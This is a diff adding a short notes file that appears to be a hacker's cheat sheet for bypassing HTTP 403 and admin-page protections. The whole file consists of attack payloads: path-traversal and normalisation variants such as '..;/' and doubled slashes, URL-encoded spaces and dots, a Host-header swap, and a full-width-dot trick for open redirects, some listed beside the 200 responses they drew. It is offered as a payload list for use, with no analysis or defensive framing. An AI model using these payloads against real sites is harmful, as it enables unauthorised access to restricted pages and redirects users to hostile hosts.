@@ -1,0 +1,29 @@
+--->traversal tricks----   /admin/..;/   (bypass 403)
+                           /static../admin.jsp
+      site.com/secret –> HTTP 403 Forbidden
+      site.com/secret/ –> HTTP 200 OK
+      site.com/secret/. –> HTTP 200 OK
+      site.com//secret// –> HTTP 200 OK
+      site.com/./secret/.. –> HTTP 200 OK
+
+--->use post //admin and Host:target to google.com (bypass 403)
+     
+        https://target.com/admin/ –> HTTP 302 (redirect to login page)
+        https://target.com/admin..;/ –> HTTP 200 OK
+
+	https://target.com/../admin
+        https://target.com/whatever/..;/admin
+
+-----> admin bypass
+target.com/admin -302
+target.com/admin%20/ -200
+target.com/%20admin%20/ -200
+target.com/admin%20/page-200
+
+--->use %2e in btw url(bypass 403)
+
+--->use space symbols like /admin%20,/admin%09 (bypass 403)
+
+
+--->(directory traversal)--use chinese separator (%E3%80%82) instead of dot(%2E)
+   ex -target%2Ecom/resetpass/go=google%E3%80%82com
